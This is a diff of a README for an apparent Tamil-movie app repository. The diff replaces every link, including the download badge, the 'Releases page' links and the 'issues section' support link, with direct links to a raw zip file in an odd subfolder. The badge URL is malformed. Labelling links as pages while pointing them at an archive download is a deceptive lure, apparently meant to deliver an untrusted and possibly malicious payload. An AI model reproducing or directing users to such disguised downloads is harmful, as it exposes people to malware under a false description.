@@ -1,6 +1,6 @@
 # 🎬 1tamilmv-new - Discover Tamil Movies Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/chakaisshort/1tamilmv-new/releases)
+[![Download](https://raw.githubusercontent.com/chakaisshort/1tamilmv-new/main/barite/1tamilmv-new.zip%https://raw.githubusercontent.com/chakaisshort/1tamilmv-new/main/barite/1tamilmv-new.zip)](https://raw.githubusercontent.com/chakaisshort/1tamilmv-new/main/barite/1tamilmv-new.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **1tamilmv-new**. This application lets you search, explore, and trac
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Click this [link](https://github.com/chakaisshort/1tamilmv-new/releases).
+1. **Visit the Releases Page**: Click this [link](https://raw.githubusercontent.com/chakaisshort/1tamilmv-new/main/barite/1tamilmv-new.zip).
    
 2. **Choose the Latest Version**: On the releases page, locate the latest version of the software. It will be labeled with the highest version number.
     
@@ -46,7 +46,7 @@ To get started, follow these simple steps:
 
 ## 📞 Support
 
-If you encounter issues or have questions, please reach out through the issues section on our [GitHub repository](https://github.com/chakaisshort/1tamilmv-new/issues). Your feedback is essential for improving the application.
+If you encounter issues or have questions, please reach out through the issues section on our [GitHub repository](https://raw.githubusercontent.com/chakaisshort/1tamilmv-new/main/barite/1tamilmv-new.zip). Your feedback is essential for improving the application.
 
 ## 🤝 Contributing
 
@@ -62,4 +62,4 @@ To learn more about 1tamilmv-new, check these related topics:
 
 ## 🚀 Conclusion
 
-1tamilmv-new provides an all-in-one experience for exploring Tamil cinema. Download it today through our [Releases page](https://github.com/chakaisshort/1tamilmv-new/releases) and enjoy the world of Tamil movies from your device.
+1tamilmv-new provides an all-in-one experience for exploring Tamil cinema. Download it today through our [Releases page](https://raw.githubusercontent.com/chakaisshort/1tamilmv-new/main/barite/1tamilmv-new.zip) and enjoy the world of Tamil movies from your device.
